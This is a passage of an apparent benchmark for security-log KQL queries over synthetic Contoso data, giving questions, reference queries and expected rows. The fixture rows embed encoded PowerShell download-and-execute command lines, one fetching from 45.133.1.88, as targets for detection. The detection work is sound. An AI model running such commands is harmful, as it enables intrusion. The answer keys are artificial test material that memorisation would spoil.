+        {"TimeGenerated": "2026-09-08T18:55:41Z", "Caller": "jsmith@contoso.com", "OperationNameValue": "MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE", "ActivityStatusValue": "Failed", "ResourceGroup": "rg-web-prod", "CallerIpAddress": "203.0.113.45", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Error", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-09T02:40:09Z", "Caller": "mgarcia@contoso.com", "OperationNameValue": "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-hr-prod", "CallerIpAddress": "91.219.236.14", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Informational", "CategoryValue": "Administrative"},
+        {"TimeGenerated": "2026-09-09T08:15:52Z", "Caller": "admin_pete@contoso.com", "OperationNameValue": "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/DELETE", "ActivityStatusValue": "Succeeded", "ResourceGroup": "rg-core-sec", "CallerIpAddress": "63.140.32.18", "SubscriptionId": "8f2a1c74-3b9e-4d52-a1f6-77c0e9b3d418", "Level": "Warning", "CategoryValue": "Administrative"}
+      ]
+    }
+  ],
+  "items": [
+    {
+      "id": "ft-001-failed-logons-sept-07",
+      "question": "Show me every failed Windows logon on September 7, 2026, with the time, host, account and source IP.",
+      "category": "filtering_and_time",
+      "tables": ["SecurityEvent"],
+      "reference_kql": "SecurityEvent\n| where TimeGenerated >= datetime(2026-09-07T00:00:00Z) and TimeGenerated < datetime(2026-09-08T00:00:00Z)\n| where EventID == 4625\n| project TimeGenerated, Computer, Account, IpAddress\n| sort by TimeGenerated asc",
+      "expected_rows": [
+        {"TimeGenerated": "2026-09-07T01:12:05Z", "Computer": "WEB01", "Account": "CONTOSO\\jsmith", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:12:31Z", "Computer": "WEB01", "Account": "CONTOSO\\jsmith", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:13:02Z", "Computer": "WEB01", "Account": "CONTOSO\\jsmith", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:13:44Z", "Computer": "WEB01", "Account": "CONTOSO\\jsmith", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:14:20Z", "Computer": "WEB01", "Account": "CONTOSO\\jsmith", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T02:41:17Z", "Computer": "FIN-SQL02", "Account": "CONTOSO\\svc_backup", "IpAddress": "198.51.100.22"},
+        {"TimeGenerated": "2026-09-07T02:42:50Z", "Computer": "FIN-SQL02", "Account": "CONTOSO\\svc_backup", "IpAddress": "198.51.100.22"}
+      ],
+      "notes": "Half-open day window. The 4625 rows on 2026-09-08 and 2026-09-09 must be excluded."
+    },
+    {
+      "id": "ft-002-signins-outside-us",
+      "question": "List every Azure AD sign-in that came from outside the United States, newest first.",
+      "category": "filtering_and_time",
+      "tables": ["SigninLogs"],
+      "reference_kql": "SigninLogs\n| where Location != \"US\"\n| project TimeGenerated, UserPrincipalName, Location, IPAddress, ResultType\n| sort by TimeGenerated desc",
+      "expected_rows": [
+        {"TimeGenerated": "2026-09-09T02:33:18Z", "UserPrincipalName": "mgarcia@contoso.com", "Location": "RU", "IPAddress": "91.219.236.14", "ResultType": "0"},
+        {"TimeGenerated": "2026-09-08T03:18:11Z", "UserPrincipalName": "svc_automation@contoso.com", "Location": "NL", "IPAddress": "185.220.101.34", "ResultType": "53003"},
+        {"TimeGenerated": "2026-09-08T03:17:05Z", "UserPrincipalName": "svc_automation@contoso.com", "Location": "NL", "IPAddress": "185.220.101.34", "ResultType": "50126"},
+        {"TimeGenerated": "2026-09-08T03:16:22Z", "UserPrincipalName": "svc_automation@contoso.com", "Location": "NL", "IPAddress": "185.220.101.34", "ResultType": "50126"},
+        {"TimeGenerated": "2026-09-08T03:15:40Z", "UserPrincipalName": "svc_automation@contoso.com", "Location": "NL", "IPAddress": "185.220.101.34", "ResultType": "50126"},
+        {"TimeGenerated": "2026-09-08T03:14:52Z", "UserPrincipalName": "svc_automation@contoso.com", "Location": "NL", "IPAddress": "185.220.101.34", "ResultType": "50126"},
+        {"TimeGenerated": "2026-09-07T01:16:20Z", "UserPrincipalName": "jsmith@contoso.com", "Location": "RO", "IPAddress": "203.0.113.45", "ResultType": "0"},
+        {"TimeGenerated": "2026-09-07T01:14:02Z", "UserPrincipalName": "jsmith@contoso.com", "Location": "RO", "IPAddress": "203.0.113.45", "ResultType": "50126"},
+        {"TimeGenerated": "2026-09-07T01:12:55Z", "UserPrincipalName": "jsmith@contoso.com", "Location": "RO", "IPAddress": "203.0.113.45", "ResultType": "50126"},
+        {"TimeGenerated": "2026-09-07T01:11:40Z", "UserPrincipalName": "jsmith@contoso.com", "Location": "RO", "IPAddress": "203.0.113.45", "ResultType": "50126"}
+      ],
+      "notes": "ResultType is a string in SigninLogs; \"0\" means success."
+    },
+    {
+      "id": "ft-003-connections-to-known-bad-ip",
+      "question": "Have any devices talked to 45.133.1.88? Show every connection attempt oldest first, including the process and account behind it.",
+      "category": "filtering_and_time",
+      "tables": ["DeviceNetworkEvents"],
+      "reference_kql": "DeviceNetworkEvents\n| where RemoteIP == \"45.133.1.88\"\n| project TimeGenerated, DeviceName, ActionType, RemotePort, InitiatingProcessFileName, InitiatingProcessAccountName\n| sort by TimeGenerated asc",
+      "expected_rows": [
+        {"TimeGenerated": "2026-09-07T01:18:40Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemotePort": 443, "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T01:23:02Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemotePort": 443, "InitiatingProcessFileName": "rundll32.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T01:28:02Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemotePort": 443, "InitiatingProcessFileName": "rundll32.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T01:33:02Z", "DeviceName": "web01.contoso.com", "ActionType": "ConnectionSuccess", "RemotePort": 443, "InitiatingProcessFileName": "rundll32.exe", "InitiatingProcessAccountName": "jsmith"},
+        {"TimeGenerated": "2026-09-07T09:05:41Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionSuccess", "RemotePort": 80, "InitiatingProcessFileName": "curl.exe", "InitiatingProcessAccountName": "mgarcia"},
+        {"TimeGenerated": "2026-09-07T09:07:13Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionFailed", "RemotePort": 4444, "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessAccountName": "mgarcia"},
+        {"TimeGenerated": "2026-09-09T06:49:20Z", "DeviceName": "hr-wks14.contoso.com", "ActionType": "ConnectionSuccess", "RemotePort": 443, "InitiatingProcessFileName": "powershell.exe", "InitiatingProcessAccountName": "mgarcia"}
+      ],
+      "notes": "Failed connections count too - filtering on ActionType would drop the port 4444 attempt."
+    },
+    {
+      "id": "ft-004-failed-azure-operations",
+      "question": "Which Azure control-plane operations failed, and who tried to run them?",
+      "category": "filtering_and_time",
+      "tables": ["AzureActivity"],
+      "reference_kql": "AzureActivity\n| where ActivityStatusValue == \"Failed\"\n| project TimeGenerated, Caller, OperationNameValue, ResourceGroup, CallerIpAddress\n| sort by TimeGenerated asc",
+      "expected_rows": [
+        {"TimeGenerated": "2026-09-08T03:20:58Z", "Caller": "svc_automation@contoso.com", "OperationNameValue": "MICROSOFT.KEYVAULT/VAULTS/SECRETS/READ", "ResourceGroup": "rg-core-sec", "CallerIpAddress": "185.220.101.34"},
+        {"TimeGenerated": "2026-09-08T03:21:35Z", "Caller": "svc_automation@contoso.com", "OperationNameValue": "MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE", "ResourceGroup": "rg-core-sec", "CallerIpAddress": "185.220.101.34"},
+        {"TimeGenerated": "2026-09-08T18:55:41Z", "Caller": "jsmith@contoso.com", "OperationNameValue": "MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE", "ResourceGroup": "rg-web-prod", "CallerIpAddress": "203.0.113.45"}
+      ]
+    },
+    {
+      "id": "ft-005-web01-early-morning-window",
+      "question": "What was logged on WEB01 between midnight and 4am UTC on September 7, 2026?",
+      "category": "filtering_and_time",
+      "tables": ["SecurityEvent"],
+      "reference_kql": "SecurityEvent\n| where Computer == \"WEB01\"\n| where TimeGenerated between (datetime(2026-09-07T00:00:00Z) .. datetime(2026-09-07T04:00:00Z))\n| project TimeGenerated, EventID, Account, Activity, IpAddress\n| sort by TimeGenerated asc",
+      "expected_rows": [
+        {"TimeGenerated": "2026-09-07T01:12:05Z", "EventID": 4625, "Account": "CONTOSO\\jsmith", "Activity": "4625 - An account failed to log on.", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:12:31Z", "EventID": 4625, "Account": "CONTOSO\\jsmith", "Activity": "4625 - An account failed to log on.", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:13:02Z", "EventID": 4625, "Account": "CONTOSO\\jsmith", "Activity": "4625 - An account failed to log on.", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:13:44Z", "EventID": 4625, "Account": "CONTOSO\\jsmith", "Activity": "4625 - An account failed to log on.", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:14:20Z", "EventID": 4625, "Account": "CONTOSO\\jsmith", "Activity": "4625 - An account failed to log on.", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:15:09Z", "EventID": 4624, "Account": "CONTOSO\\jsmith", "Activity": "4624 - An account was successfully logged on.", "IpAddress": "203.0.113.45"},
+        {"TimeGenerated": "2026-09-07T01:15:41Z", "EventID": 4672, "Account": "CONTOSO\\jsmith", "Activity": "4672 - Special privileges assigned to new logon.", "IpAddress": "203.0.113.45"}
+      ],
+      "notes": "WEB01's other SecurityEvent rows fall on 2026-09-08 at 11:55 and are outside the window."
+    },
+    {
+      "id": "agg-001-failed-logons-by-source-ip",
+      "question": "Which source IP addresses produced the most failed Windows logons, and how many each?",
+      "category": "aggregation",
+      "tables": ["SecurityEvent"],
+      "reference_kql": "SecurityEvent\n| where EventID == 4625\n| summarize FailedLogons = count() by IpAddress\n| sort by FailedLogons desc, IpAddress asc",
+      "expected_rows": [
+        {"IpAddress": "203.0.113.45", "FailedLogons": 7},
+        {"IpAddress": "198.51.100.22", "FailedLogons": 2},
+        {"IpAddress": "10.10.8.31", "FailedLogons": 1}
+      ],
+      "notes": "203.0.113.45 hits two different accounts (jsmith x5, administrator x2), so the per-IP total is 7."
+    },
+    {
+      "id": "agg-002-signin-outcome-by-user",
+      "question": "For each user, how many Azure AD sign-ins succeeded and how many failed?",
+      "category": "aggregation",
+      "tables": ["SigninLogs"],
+      "reference_kql": "SigninLogs\n| summarize Successful = countif(ResultType == \"0\"), Failed = countif(ResultType != \"0\") by UserPrincipalName\n| sort by Failed desc, UserPrincipalName asc",
+      "expected_rows": [
+        {"UserPrincipalName": "svc_automation@contoso.com", "Successful": 0, "Failed": 5},
+        {"UserPrincipalName": "jsmith@contoso.com", "Successful": 2, "Failed": 3},
+        {"UserPrincipalName": "dba_ops@contoso.com", "Successful": 1, "Failed": 1},
+        {"UserPrincipalName": "admin_pete@contoso.com", "Successful": 2, "Failed": 0},
+        {"UserPrincipalName": "mgarcia@contoso.com", "Successful": 4, "Failed": 0}
+      ],
+      "notes": "Any non-zero ResultType is a failure, including the 53003 conditional-access block."
+    },
+    {
+      "id": "agg-003-distinct-destinations-per-device",
+      "question": "How many distinct remote IP addresses did each device connect to, and how many connections in total?",
+      "category": "aggregation",
+      "tables": ["DeviceNetworkEvents"],
+      "reference_kql": "DeviceNetworkEvents\n| summarize DistinctRemoteIPs = dcount(RemoteIP), TotalConnections = count() by DeviceName\n| sort by DistinctRemoteIPs desc, DeviceName asc",
+      "expected_rows": [
+        {"DeviceName": "hr-wks14.contoso.com", "DistinctRemoteIPs": 3, "TotalConnections": 6},
+        {"DeviceName": "dc01.contoso.com", "DistinctRemoteIPs": 2, "TotalConnections": 2},
+        {"DeviceName": "web01.contoso.com", "DistinctRemoteIPs": 2, "TotalConnections": 6},
+        {"DeviceName": "fin-sql02.contoso.com", "DistinctRemoteIPs": 1, "TotalConnections": 2}
+      ]
+    },
+    {
+      "id": "agg-004-azure-activity-per-caller",
+      "question": "Who is active in the Azure subscription? Give me operation counts and the first and last time each caller showed up.",
+      "category": "aggregation",
+      "tables": ["AzureActivity"],
+      "reference_kql": "AzureActivity\n| summarize Operations = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by Caller\n| sort by Operations desc, Caller asc",
+      "expected_rows": [
+        {"Caller": "admin_pete@contoso.com", "Operations": 5, "FirstSeen": "2026-09-07T13:40:02Z", "LastSeen": "2026-09-09T08:15:52Z"},
+        {"Caller": "svc_automation@contoso.com", "Operations": 4, "FirstSeen": "2026-09-07T15:08:33Z", "LastSeen": "2026-09-08T03:21:35Z"},
+        {"Caller": "dba_ops@contoso.com", "Operations": 3, "FirstSeen": "2026-09-07T12:22:40Z", "LastSeen": "2026-09-08T14:30:17Z"},
+        {"Caller": "jsmith@contoso.com", "Operations": 1, "FirstSeen": "2026-09-08T18:55:41Z", "LastSeen": "2026-09-08T18:55:41Z"},
+        {"Caller": "mgarcia@contoso.com", "Operations": 1, "FirstSeen": "2026-09-09T02:40:09Z", "LastSeen": "2026-09-09T02:40:09Z"}
+      ]
+    },
+    {
+      "id": "agg-005-failed-logons-hourly",
+      "question": "Bucket the failed Windows logons into one-hour windows so I can see when the spikes were.",
+      "category": "aggregation",
+      "tables": ["SecurityEvent"],
+      "reference_kql": "SecurityEvent\n| where EventID == 4625\n| summarize FailedLogons = count() by Hour = bin(TimeGenerated, 1h)\n| sort by Hour asc",
+      "expected_rows": [
+        {"Hour": "2026-09-07T01:00:00Z", "FailedLogons": 5},
+        {"Hour": "2026-09-07T02:00:00Z", "FailedLogons": 2},
+        {"Hour": "2026-09-08T11:00:00Z", "FailedLogons": 2},
+        {"Hour": "2026-09-09T06:00:00Z", "FailedLogons": 1}
+      ],
+      "notes": "Empty hours are not emitted; bin() only produces buckets that contain rows."
+    },
+    {
+      "id": "join-001-ip-overlap-windows-and-entra",
+      "question": "Are any source IPs showing up in both failed Windows logons and Azure AD sign-in logs? Show the counts from each side.",
+      "category": "join_and_correlation",
+      "tables": ["SecurityEvent", "SigninLogs"],
+      "reference_kql": "let FailedWin =\n    SecurityEvent\n    | where EventID == 4625\n    | summarize WindowsFailures = count() by IpAddress;\nlet Signins =\n    SigninLogs\n    | summarize SigninAttempts = count() by IpAddress = IPAddress;\nFailedWin\n| join kind=inner (Signins) on IpAddress\n| project IpAddress, WindowsFailures, SigninAttempts\n| sort by WindowsFailures desc, IpAddress asc",
+      "expected_rows": [
+        {"IpAddress": "203.0.113.45", "WindowsFailures": 7, "SigninAttempts": 4}
+      ],
+      "notes": "SigninLogs spells the column IPAddress while SecurityEvent spells it IpAddress; the right side must be renamed before joining. Only 203.0.113.45 appears in both tables."
+    },
+    {
+      "id": "join-002-bad-ip-devices-encoded-powershell",
+      "question": "For the devices that contacted 45.133.1.88, pull any encoded PowerShell they ran alongside the connection counts.",
+      "category": "join_and_correlation",
+      "tables": ["DeviceNetworkEvents", "DeviceProcessEvents"],
+      "reference_kql": "let BadIpDevices =\n    DeviceNetworkEvents\n    | where RemoteIP == \"45.133.1.88\"\n    | summarize Connections = count(), FirstContact = min(TimeGenerated) by DeviceName;\nBadIpDevices\n| join kind=inner (\n    DeviceProcessEvents\n    | where ProcessCommandLine contains \"-enc\"\n    | project DeviceName, TimeGenerated, FileName, ProcessCommandLine\n  ) on DeviceName\n| project DeviceName, Connections, FirstContact, ProcessTime = TimeGenerated, FileName, ProcessCommandLine\n| sort by ProcessTime asc",
+      "expected_rows": [
+        {"DeviceName": "web01.contoso.com", "Connections": 4, "FirstContact": "2026-09-07T01:18:40Z", "ProcessTime": "2026-09-07T01:18:22Z", "FileName": "powershell.exe", "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA=="},
+        {"DeviceName": "hr-wks14.contoso.com", "Connections": 3, "FirstContact": "2026-09-07T09:05:41Z", "ProcessTime": "2026-09-09T06:48:10Z", "FileName": "powershell.exe", "ProcessCommandLine": "powershell.exe -nop -enc aQB3AHIAIAA0ADUALgAxADMAMwAuADEALgA4ADgALwBzADIA"}
+      ],
+      "notes": "Aggregating the network side first avoids a fan-out. The -ExecutionPolicy Bypass command line on hr-wks14 does not contain the substring \"-enc\" and must not match."
+    },
+    {
+      "id": "join-003-foreign-signin-to-azure-control-plane",
+      "question": "Did anyone who signed in successfully from outside the US then go on to run Azure control-plane operations from that same IP?",
+      "category": "join_and_correlation",
+      "tables": ["SigninLogs", "AzureActivity"],
+      "reference_kql": "SigninLogs\n| where Location != \"US\"\n| where ResultType == \"0\"\n| project SigninTime = TimeGenerated, UserPrincipalName, Location, IPAddress\n| join kind=inner (\n    AzureActivity\n    | project ActivityTime = TimeGenerated, Caller, OperationNameValue, ActivityStatusValue, CallerIpAddress\n  ) on $left.UserPrincipalName == $right.Caller, $left.IPAddress == $right.CallerIpAddress\n| project SigninTime, UserPrincipalName, Location, IPAddress, ActivityTime, OperationNameValue, ActivityStatusValue\n| sort by ActivityTime asc",
+      "expected_rows": [
+        {"SigninTime": "2026-09-07T01:16:20Z", "UserPrincipalName": "jsmith@contoso.com", "Location": "RO", "IPAddress": "203.0.113.45", "ActivityTime": "2026-09-08T18:55:41Z", "OperationNameValue": "MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE", "ActivityStatusValue": "Failed"},
+        {"SigninTime": "2026-09-09T02:33:18Z", "UserPrincipalName": "mgarcia@contoso.com", "Location": "RU", "IPAddress": "91.219.236.14", "ActivityTime": "2026-09-09T02:40:09Z", "OperationNameValue": "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION", "ActivityStatusValue": "Succeeded"}
+      ],
+      "notes": "Two-key join on identity and IP. svc_automation signed in from NL but never succeeded, so its Key Vault attempts are not in scope."
+    },
+    {
+      "id": "join-004-host-name-normalization",
+      "question": "Which hosts had failed Windows logons and also show up in Defender process telemetry? Defender reports FQDNs and the Windows log reports short names.",
+      "category": "join_and_correlation",
+      "tables": ["SecurityEvent", "DeviceProcessEvents"],
+      "reference_kql": "let WinHosts =\n    SecurityEvent\n    | where EventID == 4625\n    | summarize FailedLogons = count() by Host = tolower(Computer);\nlet DeviceHosts =\n    DeviceProcessEvents\n    | summarize ProcessEvents = count() by Host = tolower(tostring(split(DeviceName, \".\")[0]));\nWinHosts\n| join kind=inner (DeviceHosts) on Host\n| project Host, FailedLogons, ProcessEvents\n| sort by FailedLogons desc, Host asc",
+      "expected_rows": [
+        {"Host": "web01", "FailedLogons": 7, "ProcessEvents": 6},
+        {"Host": "fin-sql02", "FailedLogons": 2, "ProcessEvents": 3},
+        {"Host": "hr-wks14", "FailedLogons": 1, "ProcessEvents": 5}
+      ],
+      "notes": "dc01 has process events but no failed logons, so an inner join drops it."
+    },
+    {
+      "id": "det-001-password-spray-then-success",
+      "question": "Find brute-force attempts: any source IP with five or more failed logons against one account, and tell me whether that account later logged on successfully from the same IP.",
+      "category": "detection_logic",
+      "tables": ["SecurityEvent"],
+      "reference_kql": "let BruteForce =\n    SecurityEvent\n    | where EventID == 4625\n    | summarize Failures = count(), FirstFailure = min(TimeGenerated), LastFailure = max(TimeGenerated)\n        by Account, IpAddress\n    | where Failures >= 5;\nBruteForce\n| join kind=leftouter (\n    SecurityEvent\n    | where EventID == 4624\n    | summarize SuccessTime = min(TimeGenerated) by Account, IpAddress\n  ) on Account, IpAddress\n| project Account, IpAddress, Failures, FirstFailure, LastFailure, SuccessTime\n| sort by Failures desc, Account asc",
+      "expected_rows": [
+        {"Account": "CONTOSO\\jsmith", "IpAddress": "203.0.113.45", "Failures": 5, "FirstFailure": "2026-09-07T01:12:05Z", "LastFailure": "2026-09-07T01:14:20Z", "SuccessTime": "2026-09-07T01:15:09Z"}
+      ],
+      "notes": "The threshold is per account and IP pair, not per IP. 203.0.113.45 has 7 failures overall but only the jsmith pair reaches 5."
+    },
+    {
+      "id": "det-002-risky-successful-signin",
+      "question": "Show me any sign-in that succeeded even though Azure AD scored it high risk at the time.",
+      "category": "detection_logic",
+      "tables": ["SigninLogs"],
+      "reference_kql": "SigninLogs\n| where ResultType == \"0\"\n| where RiskLevelDuringSignIn == \"high\"\n| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, Location, ClientAppUsed\n| sort by TimeGenerated asc",
+      "expected_rows": [
+        {"TimeGenerated": "2026-09-07T01:16:20Z", "UserPrincipalName": "jsmith@contoso.com", "AppDisplayName": "Office 365 Exchange Online", "IPAddress": "203.0.113.45", "Location": "RO", "ClientAppUsed": "Browser"},
+        {"TimeGenerated": "2026-09-09T02:33:18Z", "UserPrincipalName": "mgarcia@contoso.com", "AppDisplayName": "Office 365 Exchange Online", "IPAddress": "91.219.236.14", "Location": "RU", "ClientAppUsed": "Browser"}
+      ],
+      "notes": "The high-risk svc_automation sign-ins all failed, and mgarcia's medium-risk sign-in does not qualify."
+    },
+    {
+      "id": "det-003-encoded-powershell",
+      "question": "Find any PowerShell that ran with an encoded command line.",
+      "category": "detection_logic",
+      "tables": ["DeviceProcessEvents"],
+      "reference_kql": "DeviceProcessEvents\n| where FileName =~ \"powershell.exe\"\n| where ProcessCommandLine contains \"-enc\"\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| sort by TimeGenerated asc",
+      "expected_rows": [
+        {"TimeGenerated": "2026-09-07T01:18:22Z", "DeviceName": "web01.contoso.com", "AccountName": "jsmith", "InitiatingProcessFileName": "w3wp.exe", "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA=="},
+        {"TimeGenerated": "2026-09-09T06:48:10Z", "DeviceName": "hr-wks14.contoso.com", "AccountName": "mgarcia", "InitiatingProcessFileName": "explorer.exe", "ProcessCommandLine": "powershell.exe -nop -enc aQB3AHIAIAA0ADUALgAxADMAMwAuADEALgA4ADgALwBzADIA"}
+      ],
+      "notes": "contains is a case-insensitive substring match, which is what is wanted here; has would tokenize and behave differently. The third powershell.exe row uses -ExecutionPolicy Bypass and is not encoded."
+    },
+    {
+      "id": "det-004-multi-country-signins",
+      "question": "Which accounts signed in successfully from more than one country? That is our impossible-travel shortlist.",
+      "category": "detection_logic",
+      "tables": ["SigninLogs"],
+      "reference_kql": "SigninLogs\n| where ResultType == \"0\"\n| summarize Countries = dcount(Location), Signins = count(), FirstSignin = min(TimeGenerated), LastSignin = max(TimeGenerated) by UserPrincipalName\n| where Countries > 1\n| sort by UserPrincipalName asc",
+      "expected_rows": [
+        {"UserPrincipalName": "jsmith@contoso.com", "Countries": 2, "Signins": 2, "FirstSignin": "2026-09-07T01:16:20Z", "LastSignin": "2026-09-07T07:45:10Z"},
+        {"UserPrincipalName": "mgarcia@contoso.com", "Countries": 2, "Signins": 4, "FirstSignin": "2026-09-07T08:02:13Z", "LastSignin": "2026-09-09T06:45:12Z"}
+      ],
+      "notes": "Failed sign-ins must be excluded before the summarize, otherwise svc_automation's NL failures would not change the result but jsmith's counts would be wrong."
+    },
+    {
+      "id": "det-005-repeated-outbound-beacon",
+      "question": "Look for beaconing: any device making three or more successful connections to the same destination IP and port.",
+      "category": "detection_logic",
+      "tables": ["DeviceNetworkEvents"],
+      "reference_kql": "DeviceNetworkEvents\n| where ActionType == \"ConnectionSuccess\"\n| summarize Connections = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by DeviceName, RemoteIP, RemotePort\n| where Connections >= 3\n| sort by Connections desc, DeviceName asc",
+      "expected_rows": [
+        {"DeviceName": "web01.contoso.com", "RemoteIP": "45.133.1.88", "RemotePort": 443, "Connections": 4, "FirstSeen": "2026-09-07T01:18:40Z", "LastSeen": "2026-09-07T01:33:02Z"}
+      ],
+      "notes": "hr-wks14 also reaches 45.133.1.88 three times, but across two different ports (80, 4444, 443) and one of those is a failed connection, so no group reaches the threshold."
+    },
+    {
+      "id": "schema-001-event-id-inventory",
+      "question": "What kinds of events are actually in the Windows security log here? Give me each event ID with its activity name, how many there are, and how many hosts they came from.",
+      "category": "schema_navigation",
+      "tables": ["SecurityEvent"],
+      "reference_kql": "SecurityEvent\n| summarize EventCount = count(), Hosts = dcount(Computer) by EventID, Activity\n| sort by EventCount desc, EventID asc",
+      "expected_rows": [
+        {"EventID": 4625, "Activity": "4625 - An account failed to log on.", "EventCount": 10, "Hosts": 3},
+        {"EventID": 4624, "Activity": "4624 - An account was successfully logged on.", "EventCount": 4, "Hosts": 3},
+        {"EventID": 4672, "Activity": "4672 - Special privileges assigned to new logon.", "EventCount": 2, "Hosts": 2},
+        {"EventID": 4688, "Activity": "4688 - A new process has been created.", "EventCount": 1, "Hosts": 1},
+        {"EventID": 4720, "Activity": "4720 - A user account was created.", "EventCount": 1, "Hosts": 1}
+      ]
+    },
+    {
+      "id": "schema-002-caller-resource-group-pairs",
+      "question": "Which resource groups are being touched and by whom? Just the distinct caller and resource group pairs.",
+      "category": "schema_navigation",
+      "tables": ["AzureActivity"],
+      "reference_kql": "AzureActivity\n| distinct ResourceGroup, Caller\n| sort by ResourceGroup asc, Caller asc",
+      "expected_rows": [
+        {"ResourceGroup": "rg-core-net", "Caller": "admin_pete@contoso.com"},
+        {"ResourceGroup": "rg-core-sec", "Caller": "admin_pete@contoso.com"},
+        {"ResourceGroup": "rg-core-sec", "Caller": "svc_automation@contoso.com"},
+        {"ResourceGroup": "rg-fin-prod", "Caller": "dba_ops@contoso.com"},
+        {"ResourceGroup": "rg-hr-prod", "Caller": "mgarcia@contoso.com"},
+        {"ResourceGroup": "rg-web-prod", "Caller": "jsmith@contoso.com"},
+        {"ResourceGroup": "rg-web-prod", "Caller": "svc_automation@contoso.com"}
+      ],
+      "notes": "Fourteen rows collapse to seven distinct pairs."
+    },
+    {
+      "id": "schema-003-signin-app-inventory",
+      "question": "What applications and client types show up in our Azure AD sign-in logs, with sign-in counts and how many distinct users used each?",
+      "category": "schema_navigation",
+      "tables": ["SigninLogs"],
+      "reference_kql": "SigninLogs\n| summarize SigninCount = count(), Users = dcount(UserPrincipalName) by AppDisplayName, ClientAppUsed\n| sort by SigninCount desc, AppDisplayName asc",
+      "expected_rows": [
+        {"AppDisplayName": "Azure Portal", "ClientAppUsed": "Browser", "SigninCount": 8, "Users": 3},
+        {"AppDisplayName": "Office 365 Exchange Online", "ClientAppUsed": "Browser", "SigninCount": 5, "Users": 2},
+        {"AppDisplayName": "Microsoft Teams", "ClientAppUsed": "Mobile Apps and Desktop clients", "SigninCount": 2, "Users": 2},
+        {"AppDisplayName": "Office 365 SharePoint Online", "ClientAppUsed": "Browser", "SigninCount": 2, "Users": 1},
+        {"AppDisplayName": "Azure Active Directory PowerShell", "ClientAppUsed": "Mobile Apps and Desktop clients", "SigninCount": 1, "Users": 1}
+      ],
+      "notes": "Counts include failed sign-ins; the question asks what appears in the logs, not what succeeded."
+    }
+  ]
+}
